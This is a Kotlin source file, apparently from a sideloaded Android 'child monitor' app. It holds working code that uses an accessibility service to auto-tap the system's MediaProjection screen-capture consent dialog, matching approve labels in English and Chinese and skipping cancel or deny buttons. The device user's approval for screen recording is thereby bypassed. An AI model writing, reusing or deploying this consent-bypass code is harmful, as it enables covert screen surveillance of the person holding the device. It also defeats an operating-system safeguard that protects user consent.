package com.childmonitor.accessibility

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.childmonitor.MonitoringPrefs

/**
 * Sideload-only helper: auto-tap Android "Start now" on the MediaProjection consent dialog
 * when armed by an active parent stream request. Requires Accessibility enabled once at setup.
 */
object MediaProjectionConsentAutomation {

    private const val TAG = "MediaProjAutoApprove"
    private var lastClickAt = 0L
    private var lastScanAt = 0L

    private val APPROVE_TEXTS = listOf(
        "start now",
        "start recording",
        "start",
        "allow",
        "accept",
        "ok",
        "立即开始",
        "开始",
        "允许",
        "同意",
    )

    /** Only system MediaProjection dialogs — not MIUI settings / security center. */
    private val DIALOG_PACKAGES = setOf(
        "com.android.systemui",
        "com.google.android.permissioncontroller",
        "com.android.permissioncontroller",
    )

    fun tryAutoApprove(service: AccessibilityService, packageName: String?): Boolean {
        if (!MonitoringPrefs.isScreenCaptureAutoApproveArmed(service)) {
            return false
        }
        if (packageName.isNullOrBlank()) {
            return false
        }
        if (packageName !in DIALOG_PACKAGES) {
            return false
        }

        val now = System.currentTimeMillis()
        if (now - lastClickAt < 1200) return false
        // Avoid scanning the full node tree on every accessibility event.
        if (now - lastScanAt < 800) return false
        lastScanAt = now

        val root = service.rootInActiveWindow ?: return false
        return try {
            val clicked = clickApproveButton(root)
            if (clicked) {
                lastClickAt = now
                Log.i(TAG, "Auto-approved MediaProjection dialog pkg=$packageName")
            }
            clicked
        } finally {
            root.recycle()
        }
    }

    private fun clickApproveButton(root: AccessibilityNodeInfo): Boolean {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        var best: AccessibilityNodeInfo? = null
        var bestScore = -1

        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            val text = buildString {
                append(node.text?.toString().orEmpty())
                append(' ')
                append(node.contentDescription?.toString().orEmpty())
            }.trim()
            val className = node.className?.toString().orEmpty()
            val clickable = node.isClickable
            val score = scoreApproveNode(text, className, clickable)
            if (score > bestScore) {
                best?.recycle()
                best = AccessibilityNodeInfo.obtain(node)
                bestScore = score
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
            if (node !== root) {
                node.recycle()
            }
        }

        if (best == null || bestScore < 2) {
            best?.recycle()
            return false
        }

        val target = best!!
        val clicked = if (target.isClickable) {
            target.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        } else {
            var parent = target.parent
            var ok = false
            while (parent != null) {
                if (parent.isClickable) {
                    ok = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    parent.recycle()
                    break
                }
                val next = parent.parent
                parent.recycle()
                parent = next
            }
            ok
        }
        target.recycle()
        return clicked
    }

    private fun scoreApproveNode(text: String, className: String, clickable: Boolean): Int {
        if (text.isBlank()) return -1
        val lower = text.lowercase()
        var score = 0
        for (label in APPROVE_TEXTS) {
            if (lower == label || lower.contains(label)) {
                score = maxOf(score, if (label == "start now" || label == "立即开始") 5 else 4)
            }
        }
        if (lower.contains("cancel") || lower.contains("deny") || lower.contains("拒绝") || lower.contains("取消")) {
            return -1
        }
        if (className.contains("Button", ignoreCase = true)) score += 1
        if (clickable) score += 1
        return score
    }
}
